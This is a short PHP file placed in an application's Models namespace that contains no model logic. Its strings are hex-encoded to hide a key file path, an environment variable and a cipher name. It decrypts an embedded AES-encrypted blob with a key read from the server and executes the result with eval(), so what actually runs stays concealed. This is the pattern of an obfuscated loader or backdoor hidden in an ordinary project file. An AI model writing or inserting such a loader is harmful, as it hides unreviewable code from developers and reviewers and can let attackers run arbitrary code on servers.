<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('1m6djmfO71TBO3t0UcxnPQ==');

$c=base64_decode(

'q1K6gSHY65iEj5sgWMANvt5MCkgW/BBtSerUrYVFeSyaudtG0isDXMtpj44baoKEtHpISY7ckWpL' .
'0WUKGBcGxjp+F/tBWttELrbaHe7w425Vg/y/F9MNomrH9wVqV5RLs24PLwgYlZcYE5vP+JxwH9Pf' .
'Mp968IBmn2zemM0ZCuZT6yTFWBcBk1OpCDryJ74SGImy1+wByQziMr7M7266IIY2D3Gq6ns+wHHN' .
'XAvmg5/61CoOah1hFTHGGPpgCSJ6Twf9fFe1lzTIKwgz5eJpm96/NX7jmwCxBotOfM+z4Prtq9lC' .
'hseH9o9d7sp/dFrDdlbPdQQ0qOdnyVQUTefin6s59ReJplBGG9Ag58NgEnP9zgNc2cBep2lPTy9Y' .
'rqOaTAbkmpeip5dm1qyR8qIZCEi2l7TS3sokSrfJbaQn8dUEWZJ0mDN9xfOOsJGSFxWzZ6v5728+' .
'yBUby4RRfkk5WV5XldAY1zzdN1plCNuYToxPL9BWfyQujhcF5Fep6gMuw48yQ81xacbjnUKNPEc0' .
'NcttH4/20GRnjquCh5jVa6tHHlJh/J7zxWXY+kWWTqWlhC62Q2Xkn660gAEOAr0uXmJb/AEtQRtd' .
'PaDLA5vNa3b6VOcW4JnLMvgOKR+qv75nF3Ae/oJaLSbVZo3tMeMtrRjKT0ucR/RHxpYVEfjy+413' .
'naE2kMnk3cZzv//bRkxOD4ufAVU9Tk+Z1O7LQAP/btiPGI0cIZDTGYAYGLnZsYDw4u4Lvwi3OBbX' .
'HyhvncKoxasYt7ZdcD0CHWepjSGdXpn6w5WEF1bLGZtYoZCxo81ifpbf3uOB3UEDYGJAHB0/8348' .
'0eyUJBEZ+Yjv9WC/UQ2bOcxggPq9mjshakNp1IiyK32ybdTxX3/u5Bj4Cbpf'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

